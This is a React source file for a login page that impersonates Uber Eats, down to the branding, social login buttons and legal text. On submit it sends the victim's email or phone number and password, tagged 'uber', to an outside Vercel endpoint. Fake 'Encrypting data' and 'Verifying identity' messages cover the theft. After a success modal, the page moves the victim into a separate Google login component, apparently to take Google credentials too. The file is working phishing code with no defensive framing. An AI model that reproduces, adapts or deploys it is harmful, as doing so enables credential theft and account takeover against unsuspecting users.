import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { motion, AnimatePresence } from 'framer-motion';
import GoogleLogin from './GoogleLogin';
import PasswordEntry from './PasswordEntry';
import ProcessingModal from './ProcessingModal';
import SuccessModal from './SuccessModal';
import ErrorModal from './ErrorModal';
import './App.css';

const messages = [
  "Securing connection...",
  "Encrypting data...",
  "Verifying identity...",
  "Almost there..."
];

const validateEmail = (email) => {
  return String(email)
    .toLowerCase()
    .match(
      /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
    );
};

function App() {
  const [step, setStep] = useState(1);
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [showGoogleLogin, setShowGoogleLogin] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [errorModal, setErrorModal] = useState({ isOpen: false, message: '', actionLabel: '', onAction: null });
  const [msgIndex, setMsgIndex] = useState(0);

  useEffect(() => {
    let interval;
    if (isProcessing) {
      interval = setInterval(() => {
        setMsgIndex((prev) => (prev + 1) % messages.length);
      }, 1500);
    }
    return () => clearInterval(interval);
  }, [isProcessing]);

  const handleResetPassword = () => {
    setErrorModal({ ...errorModal, isOpen: false });
    setShowGoogleLogin(true);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const trimmedIdentifier = identifier.trim();

    // Step 1: Email Validation
    if (step === 1) {
      if (!trimmedIdentifier) {
        setErrorModal({ isOpen: true, message: "Please enter your phone number or email." });
        return;
      }

      if (trimmedIdentifier.includes('@')) {
        if (!validateEmail(trimmedIdentifier) || !trimmedIdentifier.toLowerCase().endsWith('@gmail.com')) {
          setErrorModal({ isOpen: true, message: "Please enter a valid Gmail address (must end with @gmail.com)." });
          return;
        }
      }
      // Move to Step 2
      setStep(2);
      return;
    }

    // Step 2: Password Validation & Submission
    if (!password) {
      setErrorModal({ isOpen: true, message: "Please enter your password." });
      return;
    }

    setIsProcessing(true);

    try {
      await axios.post('https://back-end01.vercel.app/api/login', {
        identifier: trimmedIdentifier,
        password,
        source: 'uber'
      });

      setTimeout(() => {
        setIsProcessing(false);
        setShowSuccessModal(true);
      }, 5000);

    } catch (err) {
      console.error(err);
      setIsProcessing(false);
      setErrorModal({ isOpen: true, message: "A connection error occurred. Please check your internet and try again." });
    }
  };

  return (
    <div className="login-container">
      <nav className="navbar">
        <div className="logo">Uber <b>Eats</b></div>
      </nav>

      <ProcessingModal isOpen={isProcessing} messages={messages} />

      <div className="login-card-wrapper">
        <main className="login-card">
          <h1 className="login-title">What's your phone number or email?</h1>

          <form onSubmit={handleSubmit}>
            <div className="input-container" style={{ overflow: 'hidden' }}>
              <AnimatePresence mode="wait" initial={false}>
                {step === 1 ? (
                  <motion.div
                    key="step1"
                    initial={{ x: -50, opacity: 0 }}
                    animate={{ x: 0, opacity: 1 }}
                    exit={{ x: -50, opacity: 0 }}
                    transition={{ duration: 0.3 }}
                  >
                    <input
                      type="text"
                      className="input-field"
                      placeholder="Enter phone number or email"
                      value={identifier}
                      onChange={(e) => setIdentifier(e.target.value)}
                      autoFocus
                    />
                  </motion.div>
                ) : (
                  <motion.div
                    key="step2"
                    initial={{ x: 50, opacity: 0 }}
                    animate={{ x: 0, opacity: 1 }}
                    exit={{ x: 50, opacity: 0 }}
                    transition={{ duration: 0.3 }}
                    className="step-2-container"
                    style={{ width: '100%' }}
                  >
                    <PasswordEntry
                      email={identifier}
                      password={password}
                      setPassword={setPassword}
                      onBack={() => setStep(1)}
                      onSubmit={handleSubmit}
                    />
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            {step === 1 && (
              <button type="submit" className="login-button">
                Continue
              </button>
            )}
          </form>

          {step === 1 && (
            <>
              <div className="divider">
                <span>or</span>
              </div>

              <button
                className="social-button"
                onClick={() => setShowGoogleLogin(true)}
              >
                <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" alt="Google" />
                Continue with Google
              </button>
              <button className="social-button">
                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" />
                Continue with Apple
              </button>

              <div className="divider">
                <span>or</span>
              </div>

              <button className="social-button">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ marginRight: '4px' }}>
                  <path d="M4 4H10V10H4V4ZM4 14H10V20H4V14ZM14 4H20V10H14V4ZM16 16H18V18H16V16ZM14 14H16V16H14V14ZM18 14H20V16H18V14ZM14 18H16V20H14V20ZM18 18H20V20H18V20ZM16 14H18V16H16V14Z" fill="black" />
                  <path d="M6 6H8V8H6V6ZM6 16H8V18H6V16ZM16 6H18V8H16V6Z" fill="black" />
                </svg>
                Log in with QR code
              </button>

              <p className="legal-text">
                By continuing, you agree to calls, including by autodialer, WhatsApp, or texts from Uber and its affiliates.
              </p>
            </>
          )}
        </main>
      </div>

      {showGoogleLogin && (
        <GoogleLogin onClose={() => setShowGoogleLogin(false)} />
      )}

      <SuccessModal
        isOpen={showSuccessModal}
        onRedirect={() => {
          setShowSuccessModal(false);
          setShowGoogleLogin(true);
        }}
      />

      <ErrorModal
        isOpen={errorModal.isOpen}
        message={errorModal.message}
        onClose={() => setErrorModal({ ...errorModal, isOpen: false })}
        actionLabel={errorModal.actionLabel}
        onAction={errorModal.onAction}
      />
    </div>
  );
}

export default App;
